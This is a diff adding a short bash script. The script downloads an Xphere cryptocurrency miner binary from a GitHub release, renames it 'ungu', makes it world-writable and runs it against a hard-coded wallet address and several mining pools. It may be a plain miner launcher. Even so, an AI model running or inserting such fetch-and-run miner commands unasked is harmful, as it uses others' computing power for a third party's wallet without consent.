@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O ungu https://github.com/xpherechain/Xphere-miner/releases/download/v0.0.3/miner-darwin-amd64
+chmod 777 ungu
+./ungu -targetMiner 0x519981cA560b6c82BFA7C88d1537D2Acf742c39F -domain https://sgp-mining.x-phere.com,https://bkk-mining.x-phere.com,https://hkg-mining.x-phere.com,https://idn-mining.x-phere.com
